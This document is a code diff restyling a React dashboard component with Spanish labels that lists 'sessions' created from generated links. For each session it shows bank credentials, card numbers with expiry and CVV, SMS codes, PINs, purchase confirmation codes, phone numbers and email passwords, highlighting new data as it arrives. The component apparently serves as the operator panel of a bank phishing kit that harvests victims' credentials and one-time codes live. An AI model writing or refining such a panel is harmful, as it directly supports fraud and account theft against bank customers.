@@ -314,51 +314,67 @@ const AccessTable: React.FC<AccessTableProps> = ({
       {(isMobile && !isLandscape) ? (
         <>
           {filteredSessions.length === 0 ? (
-            <div className="w-full bg-[#1e1e1e] rounded-lg p-4 text-center text-gray-400">
+            <div className="w-full bg-[#16213e] rounded-lg p-4 text-center text-gray-400">
               No hay sesiones activas. Genere un nuevo link para crear una sesión.
             </div>
           ) : (
-            <div className="space-y-4">
+            <div className="space-y-4 scrollable-container pb-20">
               {filteredSessions.map((session, index) => (
                 <Card 
                   key={session.sessionId}
-                  className={`bg-[#1e1e1e] border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'border-[#4c4c4c]' : ''} 
-                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
+                  className={`bg-[#16213e] border-[#2a2a42] ${selectedSessionId === session.sessionId ? 'selected-row' : ''} 
+                    ${highlightedRows[session.sessionId] ? 'new-data' : ''}`}
                   onClick={() => onSelectSession(session.sessionId)}
                 >
                   <CardContent className="p-4">
                     <div className="flex justify-between items-center mb-3">
-                      <div className="font-bold text-[#ccc] text-lg">{session.banco}</div>
-                      <div className={`px-3 py-1 rounded text-xs ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold bg-[#003a4f]' : 'bg-[#2a2a2a] text-[#ccc]'}`}>
+                      <div className="font-bold text-white text-lg">{session.banco}</div>
+                      <div className={`px-3 py-1 rounded text-xs ${
+                        highlightedFields[session.sessionId]?.pasoActual 
+                        ? 'bg-[#be0046] text-white font-bold' 
+                        : 'bg-[#0c1a2a] text-gray-300'}`}
+                      >
                         {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : 'Inicio'}
                       </div>
                     </div>
                     
-                    <div className="mb-3 flex gap-1 items-center">
-                      <Copy className="h-4 w-4 text-[#888]" />
-                      <div className={`text-sm ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                        Folio: {session.folio}
+                    <div className="mb-3 flex gap-2 items-center">
+                      <Copy className="h-4 w-4 text-[#be0046]" />
+                      <div className={`text-sm ${
+                        highlightedFields[session.sessionId]?.folio 
+                        ? 'text-[#be0046] font-bold' 
+                        : 'text-white'}`}
+                      >
+                        Folio: {session.folio || 'N/A'}
                       </div>
                     </div>
                     
                     {(session.username || session.password) && (
-                      <div className="mb-3 flex gap-1 items-center">
-                        <AlertCircle className="h-4 w-4 text-[#888]" />
-                        <div className={`text-sm ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                      <div className="mb-3 flex gap-2 items-center">
+                        <AlertCircle className="h-4 w-4 text-[#be0046]" />
+                        <div className={`text-sm ${
+                          highlightedFields[session.sessionId]?.credentials 
+                          ? 'text-[#be0046] font-bold' 
+                          : 'text-white'}`}
+                        >
                           {session.username && session.password 
-                            ? `${session.username}:${session.password}` 
+                            ? `${session.username}:${maskDataIfNeeded(session.password, true)}` 
                             : '--'}
                         </div>
                       </div>
                     )}
                     
                     {session.tarjeta && (
-                      <div className="mb-3 flex gap-1 items-start">
-                        <CreditCard className="h-4 w-4 text-[#888] mt-0.5" />
-                        <div className={`text-sm ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                      <div className="mb-3 flex gap-2 items-start">
+                        <CreditCard className="h-4 w-4 text-[#be0046] mt-0.5" />
+                        <div className={`text-sm ${
+                          highlightedFields[session.sessionId]?.tarjeta 
+                          ? 'text-[#be0046] font-bold' 
+                          : 'text-white'}`}
+                        >
                           <div>{isAdmin ? session.tarjeta : '••••••••'}</div>
                           {isAdmin && (session.fechaVencimiento || session.cvv) && (
-                            <div className="text-xs mt-1 opacity-80">
+                            <div className="text-xs mt-1 text-gray-300">
                               {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                               {session.cvv && <span>CVV: {session.cvv}</span>}
                             </div>
@@ -368,36 +384,52 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     )}
                     
                     {session.sms && (
-                      <div className="mb-2 flex gap-1 items-center">
-                        <MessageSquare className="h-4 w-4 text-[#888]" />
-                        <div className={`text-sm ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                      <div className="mb-3 flex gap-2 items-center">
+                        <MessageSquare className="h-4 w-4 text-[#be0046]" />
+                        <div className={`text-sm ${
+                          highlightedFields[session.sessionId]?.sms 
+                          ? 'text-[#be0046] font-bold' 
+                          : 'text-white'}`}
+                        >
                           SMS: {isAdmin ? session.sms : '••••••••'}
                         </div>
                       </div>
                     )}
                     
                     {session.nip && (
-                      <div className="mb-2 flex gap-1 items-center">
-                        <KeyRound className="h-4 w-4 text-[#888]" />
-                        <div className={`text-sm ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                      <div className="mb-3 flex gap-2 items-center">
+                        <KeyRound className="h-4 w-4 text-[#be0046]" />
+                        <div className={`text-sm ${
+                          highlightedFields[session.sessionId]?.nip 
+                          ? 'text-[#be0046] font-bold' 
+                          : 'text-white'}`}
+                        >
                           NIP: {isAdmin ? session.nip : '••••••••'}
                         </div>
                       </div>
                     )}
                     
                     {session.smsCompra && (
-                      <div className="mb-2 flex gap-1 items-center">
-                        <CheckCircle2 className="h-4 w-4 text-[#888]" />
-                        <div className={`text-sm ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                      <div className="mb-3 flex gap-2 items-center">
+                        <CheckCircle2 className="h-4 w-4 text-[#be0046]" />
+                        <div className={`text-sm ${
+                          highlightedFields[session.sessionId]?.smsCompra 
+                          ? 'text-[#be0046] font-bold' 
+                          : 'text-white'}`}
+                        >
                           SMS Compra: {isAdmin ? session.smsCompra : '••••••••'}
                         </div>
                       </div>
                     )}
                     
                     {session.celular && (
-                      <div className="mb-2 flex gap-1 items-center">
-                        <Smartphone className="h-4 w-4 text-[#888]" />
-                        <div className={`text-sm ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                      <div className="mb-3 flex gap-2 items-center">
+                        <Smartphone className="h-4 w-4 text-[#be0046]" />
+                        <div className={`text-sm ${
+                          highlightedFields[session.sessionId]?.celular 
+                          ? 'text-[#be0046] font-bold' 
+                          : 'text-white'}`}
+                        >
                           Celular: {isAdmin ? session.celular : '••••••••'}
                         </div>
                       </div>
@@ -411,36 +443,38 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     )}
                     
                     {/* Información del creador (solo visible para administradores) */}
-                    <div className="mb-3 flex gap-1 items-center">
-                      <Target className="h-4 w-4 text-[#888]" />
-                      <div className="text-sm text-[#ccc]">
-                        Creado por: {session.createdBy || '--'}
+                    <div className="mb-3 flex gap-2 items-center">
+                      <Target className="h-4 w-4 text-[#be0046]" />
+                      <div className="text-sm text-white text-opacity-80">
+                        Creado por: {session.createdBy || '--'} • {new Date(session.createdAt || Date.now()).toLocaleString()}
                       </div>
                     </div>
                     
-                    <div className="flex gap-2 mt-4 border-t border-[#333] pt-3">
+                    <div className="flex gap-2 mt-4 border-t border-[#2a2a42] pt-3">
                       <Button 
                         variant="outline" 
                         size="sm"
-                        className="flex-1 bg-[#2c2c2c] hover:bg-[#1f1f1f] border-[#444]"
+                        className="flex-1 border-[#2a2a42] hover:bg-[#0c1a2a] text-white"
                         onClick={(e) => {
                           e.stopPropagation();
                           onSelectSession(session.sessionId);
                         }}
                       >
+                        <ArrowRight className="h-3 w-3 mr-1" />
                         Seleccionar
                       </Button>
                       
                       {!session.saved && (
                         <Button 
                           size="sm"
-                          className="flex-1 bg-[#005c99] hover:bg-[#004d80] text-white"
+                          className="flex-1 bg-[#16213e] hover:bg-[#0c1a2a] text-white"
                           onClick={(e) => {
                             e.stopPropagation();
                             saveSessionMutation.mutate(session.sessionId);
                           }}
                           disabled={saveSessionMutation.isPending}
                         >
+                          <Download className="h-3 w-3 mr-1" />
                           {saveSessionMutation.isPending ? '...' : 'Guardar'}
                         </Button>
                       )}
@@ -449,7 +483,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                         <Button 
                           variant="destructive"
                           size="sm"
-                          className="flex-1 bg-[#990000] hover:bg-[#800000]"
+                          className="flex-1 bg-[#be0046] hover:bg-[#a30039] text-white"
                           onClick={(e) => {
                             e.stopPropagation();
                             setSessionToDelete(session);
@@ -469,10 +503,10 @@ const AccessTable: React.FC<AccessTableProps> = ({
         </>
       ) : (
         /* Vista para desktop: tabla */
-        <div className="overflow-x-auto">
-          <table className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
+        <div className="overflow-x-auto scrollable-container">
+          <table className="data-table">
             <thead>
-              <tr className="bg-[#222]">
+              <tr>
                 <th className="p-3 text-left">#</th>
                 <th className="p-3 text-left">Folio</th>
                 <th className="p-3 text-left">User:Password</th>
@@ -491,7 +525,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={12} className="p-4 text-center text-gray-400">
+                  <td colSpan={13} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -500,62 +534,63 @@ const AccessTable: React.FC<AccessTableProps> = ({
               {filteredSessions.map((session, index) => (
                 <tr 
                   key={session.sessionId}
-                  className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''} 
-                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
+                  className={`border-b border-[#2a2a42] hover:bg-[#16213e]/70 
+                    ${selectedSessionId === session.sessionId ? 'selected-row' : ''} 
+                    ${highlightedRows[session.sessionId] ? 'new-data' : ''}`}
                   onClick={() => onSelectSession(session.sessionId)}
                 >
-                  <td className="p-3 text-[#ccc]">{index + 1}</td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className="p-3 text-white">{index + 1}</td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {session.folio}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {session.username && session.password 
-                      ? `${session.username}:${session.password}` 
+                      ? `${session.username}:${maskDataIfNeeded(session.password, true)}` 
                       : '--'}
                   </td>
-                  <td className="p-3 text-[#ccc]">{session.banco}</td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className="p-3 text-white">{session.banco}</td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     <div>
                       <span className="block">{isAdmin ? (session.tarjeta || '--') : '••••••••'}</span>
                       {isAdmin && (session.fechaVencimiento || session.cvv) && (
-                        <div className="text-xs mt-1 opacity-80">
+                        <div className="text-xs mt-1 text-gray-300">
                           {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                           {session.cvv && <span>CVV: {session.cvv}</span>}
                         </div>
                       )}
                     </div>
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {isAdmin ? (session.sms || '--') : '••••••••'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {isAdmin ? (session.nip || '--') : '••••••••'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {isAdmin ? (session.smsCompra || '--') : '••••••••'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {isAdmin ? (session.celular || '--') : '••••••••'}
                   </td>
-                  <td className="p-3 text-[#ccc]">
+                  <td className="p-3 text-white">
                     {session.correo || session.contrasena ? (
                       <div>
-                        {session.correo && <div className="text-green-400 text-sm">{session.correo}</div>}
-                        {session.contrasena && <div className="text-green-400 text-sm mt-1">{session.contrasena}</div>}
+                        {session.correo && <div className="text-[#be0046] text-sm">{session.correo}</div>}
+                        {session.contrasena && <div className="text-[#be0046] text-sm mt-1">{session.contrasena}</div>}
                       </div>
                     ) : '--'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {/* Convert pasoActual to a more readable format */}
                     {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
                   </td>
-                  <td className="p-3 text-[#ccc]">
+                  <td className="p-3 text-white text-opacity-80">
                     {session.createdBy || '--'}
                   </td>
                   <td className="p-3 text-[#ccc]">
-                    <div className="flex space-x-1">
+                    <div className="flex space-x-2">
                       <button 
-                        className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                        className="text-xs secondary-button py-1 px-2"
                         onClick={(e) => {
                           e.stopPropagation();
                           onSelectSession(session.sessionId);
@@ -566,20 +601,21 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       
                       {!session.saved && (
                         <button 
-                          className="text-xs bg-[#005c99] hover:bg-[#004d80] text-white px-2 py-1 rounded"
+                          className="text-xs bg-[#16213e] hover:bg-[#0f172a] text-white px-2 py-1 rounded flex items-center"
                           onClick={(e) => {
                             e.stopPropagation();
                             saveSessionMutation.mutate(session.sessionId);
                           }}
                           disabled={saveSessionMutation.isPending}
                         >
+                          <Download className="h-3 w-3 mr-1" />
                           {saveSessionMutation.isPending ? '...' : 'Guardar'}
                         </button>
                       )}
                       
                       {isAdmin && (
                         <button 
-                          className="text-xs bg-[#990000] hover:bg-[#800000] text-white px-2 py-1 rounded"
+                          className="text-xs primary-button py-1 px-2"
                           onClick={(e) => {
                             e.stopPropagation();
                             setSessionToDelete(session);
